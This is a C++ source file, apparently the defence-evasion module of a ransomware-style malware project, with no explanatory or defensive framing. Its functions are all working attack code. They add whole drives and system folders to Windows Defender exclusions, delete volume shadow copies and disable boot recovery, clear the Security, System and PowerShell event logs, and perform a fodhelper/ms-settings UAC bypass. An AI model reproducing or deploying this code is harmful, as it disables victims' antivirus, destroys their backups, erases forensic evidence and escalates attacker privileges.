#include "evasion.h"
#include <windows.h>
#include <shellapi.h>

static const wchar_t* EXCLUSION_PATHS[] = {
    L"C:\\", L"D:\\", L"E:\\",
    L"%AppData%", L"%Temp%", L"%SystemRoot%",
    nullptr
};

void add_defender_exclusions() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) return;

    DWORD val = 0;
    for (int i = 0; EXCLUSION_PATHS[i]; i++)
        RegSetValueExW(hKey, EXCLUSION_PATHS[i], 0,
            REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hKey);
}

void wipe_shadow_copies() {
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"open";
    sei.nShow  = SW_HIDE;

    sei.lpFile       = L"vssadmin.exe";
    sei.lpParameters = L"delete shadows /all /quiet";
    ShellExecuteExW(&sei);
    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    sei.lpFile       = L"wmic.exe";
    sei.lpParameters = L"shadowcopy delete";
    ShellExecuteExW(&sei);
    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    sei.lpFile       = L"bcdedit.exe";
    sei.lpParameters = L"/set {default} recoveryenabled No";
    ShellExecuteExW(&sei);
    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }
}

void clear_event_logs() {
    const wchar_t* logs[] = {
        L"Application", L"System", L"Security",
        L"Microsoft-Windows-PowerShell/Operational", nullptr
    };
    for (int i = 0; logs[i]; i++) {
        HANDLE h = OpenEventLogW(NULL, logs[i]);
        if (h) { ClearEventLogW(h, NULL); CloseEventLog(h); }
    }
}

void uac_bypass() {
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);

    wchar_t self_path[MAX_PATH];
    GetModuleFileNameW(NULL, self_path, MAX_PATH);

    RegSetValueExW(hKey, L"", 0, REG_SZ,
        (BYTE*)self_path,
        (DWORD)((wcslen(self_path) + 1) * sizeof(wchar_t)));
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
        (BYTE*)L"", sizeof(wchar_t));
    RegCloseKey(hKey);

    ShellExecuteW(NULL, L"open", L"fodhelper.exe",
        NULL, NULL, SW_HIDE);
}
